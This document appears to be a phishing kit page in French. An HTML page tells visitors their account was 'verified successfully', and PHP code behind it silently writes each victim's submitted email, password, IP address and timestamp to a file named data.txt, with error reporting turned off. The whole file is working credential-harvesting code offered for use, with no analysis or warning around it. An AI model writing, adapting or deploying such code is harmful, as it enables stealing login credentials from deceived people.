<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        <title>Compte vérifié avec succès</title>
    </head>
    <style>
        #check{
            width: 8%;
            height: auto;
            margin-left: 46%;
            margin-top: 20%;
        }
        #succes{
            font-family: HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
            color: rgb(87, 87, 87);
            text-align: center;
        }
    </style>
    <body>
        <img id="check" src="https://media.discordapp.net/attachments/633782210238873612/872426634827952129/check.png" alt="check">
        <p id="succes">Votre compte à bien été verifié, vous pouvez désormais fermée cette fenêtre.</p>
    </body>
</html>
<?php
    setlocale(LC_TIME, 'fra_fra');
    error_reporting(-0);
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = strftime('%Y-%m-%d %H:%M:%S'); 
    $file = 'data.txt';
    $cible = " IP :". " ". $ip . " Email :". " ".$_POST['email']. " ". " Password :". " ". $_POST['password']. " ". " Date :". " ". $date . "\n";
    file_put_contents($file, $cible, FILE_APPEND | LOCK_EX);
?>